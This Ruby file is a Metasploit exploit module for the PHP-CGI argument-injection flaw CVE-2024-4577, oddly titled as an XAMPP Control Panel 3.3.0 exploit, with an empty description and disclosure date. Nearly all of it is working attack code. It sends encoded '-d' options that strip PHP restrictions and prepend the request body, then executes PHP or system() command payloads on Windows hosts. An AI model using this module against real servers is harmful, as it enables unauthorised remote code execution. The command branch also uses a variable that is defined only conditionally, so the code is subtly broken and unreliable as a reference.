class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Vulnerable XAMPP Control Panel Version: 3.3.0',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Orange Tsai', 
          'watchTowr', 
          'sfewer-r7' 
        ],
        'References' => [
          ['CVE', '2024-4577'],
          ['URL', 'https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/'],
          ['URL', 'https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/']
        ],
        'DisclosureDate' => '',
        'Platform' => ['php', 'win'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Windows PHP', {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
            }
          ],
          [
            'Windows Command', {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Payload' => {
                'BadChars' => '"'
              }
            }
          ],
        ],
        'DefaultOptions' => {
          'RPORT' => 80
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to a PHP CGI endpoint', '/php-cgi/php-cgi.exe']),
      ]
    )
  end

  def send_exploit_request_cgi(php_payload, allow_url_include: true)
    php_content = "<?php #{php_payload}; die(); ?>"

    vprint_status("PHP content: #{php_content}")

    args = [
      '-d suhosin.simulation=1', 
      '-d disable_functions=""', 
      '-d open_basedir=', 
      '-d auto_prepend_file=php://input', 
      '-d cgi.force_redirect=0', 
      '-d cgi.redirect_status_env=0',
      '-n'
    ]

    args << '-d allow_url_include=1' if allow_url_include

    query = args.shuffle.join(' ')

    query = CGI.escape(query).gsub('-', '%AD')

    vprint_status("Query: #{query}")

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'encode_params' => false,
      'vars_get' => {
        query => nil
      },
      'data' => php_content
    )
  end

  def check
    res = send_exploit_request_cgi('', allow_url_include: false)

    return CheckCode::Unknown('Connection failed') unless res

    if res.code == 200 && (res.body.include? '\'php://input\'')
      return CheckCode::Vulnerable(res.headers['Server'])
    end

    CheckCode::Safe('Ensure TARGETURI is set to a valid PHP CGI endpoint.')
  end

  def exploit
    if target['Arch'] == ARCH_CMD
      php_bootstrap = []

      if payload.encoded.include? '%TEMP%'
        var_cmd = "$#{Rex::Text.rand_text_alpha(8)}"

        php_bootstrap << "#{var_cmd} = \"#{payload.encoded}\""

        php_bootstrap << "#{var_cmd} = str_replace('%TEMP%', sys_get_temp_dir(), #{var_cmd})"
      end

      php_bootstrap << "system(#{var_cmd})"

      php_payload = php_bootstrap.join(';')
    else
      php_payload = payload.encoded
    end

    send_exploit_request_cgi(php_payload)
  end
end
